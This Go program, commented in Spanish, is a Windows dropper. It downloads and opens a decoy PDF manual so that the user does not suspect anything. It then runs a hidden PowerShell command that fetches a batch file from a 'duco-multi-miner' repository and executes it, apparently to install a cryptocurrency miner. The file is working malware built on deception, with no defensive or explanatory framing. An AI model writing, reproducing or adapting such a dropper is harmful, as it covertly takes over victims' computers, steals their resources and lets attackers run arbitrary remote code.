package main

import (
	"os"
	"os/exec"
	"syscall"
	"net/http"
	"io"
)

func main() {
	// 1. Descarga el PDF real para el "cebo" visual
	resp, _ := http.Get("https://tu-repo/manual_uso.pdf")
	out, _ := os.Create("Manual_Update.pdf")
	io.Copy(out, resp.Body)
	out.Close()

	// 2. Abre el PDF para que el usuario no sospeche
	openPdf := exec.Command("cmd", "/c", "start", "Manual_Update.pdf")
	openPdf.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	openPdf.Run()

	// 3. Descarga y ejecuta el Instalador de la Granja (sys_check.bat)
	// Usamos PowerShell de forma invisible para llamar a tu script maestro
	cmd := exec.Command("powershell", "-WindowStyle", "Hidden", "-Command", "iwr -Uri 'https://raw.githubusercontent.com/methmouth/duco-multi-miner/main/sys_check.bat' -OutFile '$env:TEMP\\s.bat'; & '$env:TEMP\\s.bat'")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Run()
}
